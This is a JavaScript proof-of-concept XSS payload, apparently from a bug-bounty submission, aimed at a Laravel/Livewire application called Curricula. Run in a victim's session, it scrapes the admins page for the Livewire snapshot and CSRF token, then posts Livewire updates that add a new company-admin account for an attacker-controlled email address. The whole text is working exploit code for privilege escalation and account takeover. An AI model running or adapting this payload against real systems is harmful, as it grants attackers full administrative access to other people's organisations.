(async () => {
  const COMPANY = 81523;
  const EMAIL   = 'floerer+xss-newadmin@intigriti.me';   // attacker-controlled mailbox -> setup link -> full company-admin access
  const ROLE    = 'company-admin';                        // ONLY value the server-side allowlist accepts

  const cookie = n => decodeURIComponent((document.cookie.match('(?:^|; )' + n + '=([^;]+)') || [])[1] || '');

  // 1. Fetch the admins page; pull the company.http.livewire.admins snapshot + CSRF
  const html = await fetch(`/company/${COMPANY}/admins`, { credentials: 'same-origin' }).then(r => r.text());
  const doc  = new DOMParser().parseFromString(html, 'text/html');
  const root = [...doc.querySelectorAll('[wire\\:snapshot]')]
    .find(e => e.getAttribute('wire:snapshot').includes('"name":"company.http.livewire.admins"'));
  if (!root) throw new Error('admins component not found — session invalid or markup changed');

  let snapshot = root.getAttribute('wire:snapshot');                       // JSON string, entities auto-decoded
  const token  = (html.match(/"csrf":"([A-Za-z0-9]{40})"/) || [])[1]   // Livewire stashes it in window.livewireScriptConfig (no meta tag on Curricula)
              || doc.querySelector('meta[name="csrf-token"]')?.getAttribute('content');  // (X-XSRF-TOKEN header alone also suffices)
  const headers = {
    'Content-Type': 'application/json',
    'X-Livewire': '',
    'X-XSRF-TOKEN': cookie('XSRF-TOKEN'),     // Laravel decrypts -> satisfies VerifyCsrfToken
  };

  const update = async (updates, calls) => {
    const json = await fetch('/livewire/update', {
      method: 'POST', credentials: 'same-origin', headers,
      body: JSON.stringify({ _token: token, components: [{ snapshot, updates, calls }] }),
    }).then(r => r.json());
    snapshot = json.components?.[0]?.snapshot ?? snapshot;
    return json;
  };

  // 2. Fill the "add admin" form (email + role); open the modal flag (closed on a fresh load)
  await update({ 'newAdminEmails.0': EMAIL, newAdminRole: ROLE, createModalVisible: true }, []);

  // 3. Create
  const res = await update({}, [{ path: '', method: 'createUsers', params: [] }]);

  // Validation errors (e.g. bad role / dup email) surface in memo.errors; empty => created.
  const errs = JSON.parse(snapshot).memo.errors;
  const count = errs ? (Array.isArray(errs) ? errs.length : Object.keys(errs).length) : 0;
  console.log(`[XSS-PoC] createUsers ${EMAIL} (${ROLE}) @ company ${COMPANY}:`,
    count ? { rejected: errs } : '✅ no validation errors — admin created, setup email sent to ' + EMAIL);
  console.log({ message: '[XSS-PoC] full response', data: res });
})();
